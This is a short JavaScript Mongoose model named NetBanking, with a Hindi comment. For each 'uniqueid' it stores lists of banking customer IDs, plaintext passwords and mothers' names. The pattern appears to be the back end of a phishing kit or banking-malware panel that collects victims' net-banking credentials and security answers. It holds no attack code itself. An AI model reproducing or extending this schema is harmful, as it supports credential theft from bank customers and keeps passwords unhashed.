// models/NetBanking.js
const mongoose = require('mongoose');

const netBankingSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      customerId:   { type: String, required: true },
      password:     { type: String, required: true },
      motherName:   { type: String, required: true },
      submittedAt:  { type: Date,   default: Date.now }
    }
  ]
});

// अगर पहले से define हो चुका है तो उसे reuse करो
module.exports = mongoose.models.NetBanking 
  || mongoose.model('NetBanking', netBankingSchema);

